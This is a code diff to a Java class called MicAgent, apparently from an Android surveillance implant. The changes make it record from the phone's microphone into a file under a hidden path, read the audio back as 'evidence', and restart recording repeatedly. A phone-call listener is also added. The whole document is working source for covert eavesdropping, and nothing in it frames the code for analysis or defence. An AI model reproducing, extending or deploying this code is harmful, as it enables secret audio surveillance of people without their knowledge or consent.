@@ -17,6 +17,7 @@ import com.ht.RCSAndroidGUI.LogR;
 import com.ht.RCSAndroidGUI.StateRun;
 import com.ht.RCSAndroidGUI.Status;
 import com.ht.RCSAndroidGUI.evidence.EvidenceType;
+import com.ht.RCSAndroidGUI.file.AutoFile;
 import com.ht.RCSAndroidGUI.file.Path;
 import com.ht.RCSAndroidGUI.util.Check;
 import com.ht.RCSAndroidGUI.util.DataBuffer;
@@ -26,6 +27,7 @@ import com.ht.RCSAndroidGUI.util.Utils;
 // TODO: Auto-generated Javadoc
 /**
  * The Class MicAgent.
+ * 8000KHz, 32bit
  * 
  * @ref: http://developer.android.com/reference/android/media/MediaRecorder.html
  *       Recipe: Recording Audio Files Recording audio using MediaRecorder is
@@ -69,6 +71,7 @@ public class MicAgent extends AgentBase {
 	private int numFailures;
 
 	private long fId;
+	private String currentRecFile;
 
 	/*
 	 * (non-Javadoc)
@@ -81,6 +84,7 @@ public class MicAgent extends AgentBase {
 			synchronized (stateLock) {
 				if (state != StateRun.STARTED) {
 					addPhoneListener();
+					recorder = new MediaRecorder();
 					startRecorder();
 					Log.d("QZ", TAG + "started");
 				}
@@ -117,6 +121,8 @@ public class MicAgent extends AgentBase {
 				// #endif
 				saveRecorderEvidence();
 				stopRecorder();
+				recorder.release();
+				recorder =null;
 			}
 			state = StateRun.STOPPED;
 
@@ -154,8 +160,8 @@ public class MicAgent extends AgentBase {
 	}
 
 	private byte[] getAvailable() {
-		// TODO Auto-generated method stub
-		return null;
+		AutoFile file = new AutoFile(currentRecFile);
+		return file.read();
 	}
 
 	private void removePhoneListener() {
@@ -185,8 +191,12 @@ public class MicAgent extends AgentBase {
 		synchronized (stateLock) {
 			if (state == StateRun.STARTED) {
 
+				Log.d("QZ", TAG + " (go): max amplitude=" + recorder.getMaxAmplitude());
 				if (numFailures < 10) {
+					stopRecorder();
 					saveRecorderEvidence();
+					restartRecorder();
+
 				} else {
 					Log.d("QZ", TAG + "numFailures: " + numFailures);
 					suspend();
@@ -204,12 +214,24 @@ public class MicAgent extends AgentBase {
 		}
 	}
 
+	private void restartRecorder() {
+		try {
+			
+			startRecorder();
+		} catch (IllegalStateException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+	}
+
 	private boolean callInAction() {
 		// TODO Auto-generated method stub
 		return false;
 	}
 
-	// SNIPPET
 	/**
 	 * Start recorder.
 	 * 
@@ -224,11 +246,13 @@ public class MicAgent extends AgentBase {
 		fId = dateTime.getFiledate();
 		numFailures = 0;
 
-		final MediaRecorder recorder = new MediaRecorder();
+		currentRecFile = Path.hidden() + "currentRec";
+		
 		recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
-		recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
+		recorder.setOutputFormat(MediaRecorder.OutputFormat.RAW_AMR);
 		recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
-		recorder.setOutputFile(Path.hidden() + "currentRec");
+		
+		recorder.setOutputFile(currentRecFile);
 		recorder.prepare();
 		recorder.start(); // Recording is now started
 
@@ -243,7 +267,7 @@ public class MicAgent extends AgentBase {
 			recorder.stop();
 			recorder.reset(); // You can reuse the object by going back to
 								// setAudioSource() step
-			recorder.release(); // Now the object cannot be reused
+			//recorder.release(); // Now the object cannot be reused
 		}
 	}
 
